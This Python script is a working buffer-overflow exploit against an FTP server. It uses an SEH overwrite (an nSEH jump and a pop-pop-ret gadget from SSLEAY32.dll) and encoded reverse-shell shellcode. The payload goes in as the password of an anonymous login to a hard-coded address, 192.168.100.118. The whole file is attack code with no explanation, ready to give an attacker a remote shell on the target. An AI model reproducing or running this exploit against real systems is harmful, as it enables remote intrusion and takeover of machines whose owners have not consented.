import socket
import os
import sys
import struct
from ftplib import FTP


revshell =  b""
revshell += b"\xdb\xc0\xd9\x74\x24\xf4\xbe\x3d\x92\x2e\x39\x5f"
revshell += b"\x31\xc9\xb1\x52\x31\x77\x17\x83\xc7\x04\x03\x4a"
revshell += b"\x81\xcc\xcc\x48\x4d\x92\x2f\xb0\x8e\xf3\xa6\x55"
revshell += b"\xbf\x33\xdc\x1e\x90\x83\x96\x72\x1d\x6f\xfa\x66"
revshell += b"\x96\x1d\xd3\x89\x1f\xab\x05\xa4\xa0\x80\x76\xa7"
revshell += b"\x22\xdb\xaa\x07\x1a\x14\xbf\x46\x5b\x49\x32\x1a"
revshell += b"\x34\x05\xe1\x8a\x31\x53\x3a\x21\x09\x75\x3a\xd6"
revshell += b"\xda\x74\x6b\x49\x50\x2f\xab\x68\xb5\x5b\xe2\x72"
revshell += b"\xda\x66\xbc\x09\x28\x1c\x3f\xdb\x60\xdd\xec\x22"
revshell += b"\x4d\x2c\xec\x63\x6a\xcf\x9b\x9d\x88\x72\x9c\x5a"
revshell += b"\xf2\xa8\x29\x78\x54\x3a\x89\xa4\x64\xef\x4c\x2f"
revshell += b"\x6a\x44\x1a\x77\x6f\x5b\xcf\x0c\x8b\xd0\xee\xc2"
revshell += b"\x1d\xa2\xd4\xc6\x46\x70\x74\x5f\x23\xd7\x89\xbf"
revshell += b"\x8c\x88\x2f\xb4\x21\xdc\x5d\x97\x2d\x11\x6c\x27"
revshell += b"\xae\x3d\xe7\x54\x9c\xe2\x53\xf2\xac\x6b\x7a\x05"
revshell += b"\xd2\x41\x3a\x99\x2d\x6a\x3b\xb0\xe9\x3e\x6b\xaa"
revshell += b"\xd8\x3e\xe0\x2a\xe4\xea\xa7\x7a\x4a\x45\x08\x2a"
revshell += b"\x2a\x35\xe0\x20\xa5\x6a\x10\x4b\x6f\x03\xbb\xb6"
revshell += b"\xf8\xec\x94\xdc\x8d\x84\xe6\x1c\x7f\x09\x6e\xfa"
revshell += b"\x15\xa1\x26\x55\x82\x58\x63\x2d\x33\xa4\xb9\x48"
revshell += b"\x73\x2e\x4e\xad\x3a\xc7\x3b\xbd\xab\x27\x76\x9f"
revshell += b"\x7a\x37\xac\xb7\xe1\xaa\x2b\x47\x6f\xd7\xe3\x10"
revshell += b"\x38\x29\xfa\xf4\xd4\x10\x54\xea\x24\xc4\x9f\xae"
revshell += b"\xf2\x35\x21\x2f\x76\x01\x05\x3f\x4e\x8a\x01\x6b"
revshell += b"\x1e\xdd\xdf\xc5\xd8\xb7\x91\xbf\xb2\x64\x78\x57"
revshell += b"\x42\x47\xbb\x21\x4b\x82\x4d\xcd\xfa\x7b\x08\xf2"
revshell += b"\x33\xec\x9c\x8b\x29\x8c\x63\x46\xea\xbc\x29\xca"
revshell += b"\x5b\x55\xf4\x9f\xd9\x38\x07\x4a\x1d\x45\x84\x7e"
revshell += b"\xde\xb2\x94\x0b\xdb\xff\x12\xe0\x91\x90\xf6\x06"
revshell += b"\x05\x90\xd2"

nSEH = "\x74\x0B\x75\x09"           # NetJumping
SEH = struct.pack("<I", 0x100107b3) # ppr -SSLEAY32.dll

buffer  = "\x2c"
buffer += "A" * 2559
buffer += nSEH
buffer += SEH
buffer += "\x90" * 30
buffer += revshell
buffer += "D" * (4000 - len(buffer))

print "[*] Sending evil ftp request to target"
ftp = FTP()
ftp.connect('192.168.100.118', 21)
ftp.login('anonymous', buffer)

